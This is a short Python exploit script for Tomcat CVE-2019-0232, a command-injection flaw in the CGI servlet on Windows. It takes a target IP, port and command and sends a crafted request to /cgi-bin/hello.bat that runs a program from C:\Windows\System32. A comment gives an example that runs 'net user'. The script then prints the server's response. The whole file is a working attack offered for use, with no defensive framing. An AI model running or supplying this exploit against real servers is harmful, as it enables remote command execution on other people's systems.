import requests
import sys
import argparse
# http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user


parser = argparse.ArgumentParser(description='Tomcat cve-2019-0232',
                                     usage='use "python %(prog)s --help" for more information',
                                     formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-i", "--ip",
                        dest="ip",
                        help="target ip (127.0.0.1)"
                        )
parser.add_argument("-p", "--port",
                        dest="port",
                        help="target port (8080)"
                        )
parser.add_argument("-c", "--cmd",
                        dest="cmd",
                        help="command"
                        )
    
args = parser.parse_args()
url="http://"+args.ip+":"+args.port





url_dir = "/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C"



vuln_url = url + url_dir +args.cmd



print ("Usage: python CVE-2019-0232.py url cmd")

print ("The Vuln url:\n" ,vuln_url)

r = requests.get(vuln_url)


print ("\nThe Vuln Response Content: \n\n" , r.content)

